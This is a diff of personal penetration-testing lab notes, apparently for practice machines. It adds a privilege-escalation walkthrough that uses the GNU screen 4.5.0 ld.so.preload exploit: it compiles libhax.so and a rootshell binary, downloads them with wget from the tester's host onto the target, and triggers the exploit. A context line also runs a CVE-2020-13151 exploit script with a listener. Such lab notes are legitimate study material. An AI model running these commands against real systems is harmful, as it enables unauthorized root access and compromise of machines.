@@ -104,10 +104,40 @@ python3 cve2020-13151.py --ahost 192.168.193.143 --lhost 192.168.45.219 --lport 
 https://github.com/DominicBreuker/pspy
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 
-# find screen unusualy binary from linpeas
+# find screen unusual binary from linpeas
 https://www.exploit-db.com/exploits/41154
 https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
 
+
+```
+
+.143 privesc
+```
+# find screen unusual binary from linpeas
+https://www.exploit-db.com/exploits/41154
+https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
+
+# create exploit files and copy to container root 
+cd /home/kali/lab1
+cp rootshell.c /var/lib/machines/xen-test/root/
+cp libhax.c /var/lib/machines/xen-test/root/
+
+cd /var/lib/machines/xen-test/root
+sudo systemd-nspawn -M xen-test
+
+# compile exploit in container
+gcc -fPIC -shared -ldl -o libhax.so libhax.c
+gcc -o rootshell rootshell.c
+
+# copy back to lab folder
+cp libhax.so /home/kali/lab1/
+cp rootshell /home/kali/lab1/
+
+# download files to target
+wget http://192.168.45.219/libhax.so
+wget http://192.168.45.219/rootshell
+
+screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/home/aero/libhax.so"
 ```
 
 .144
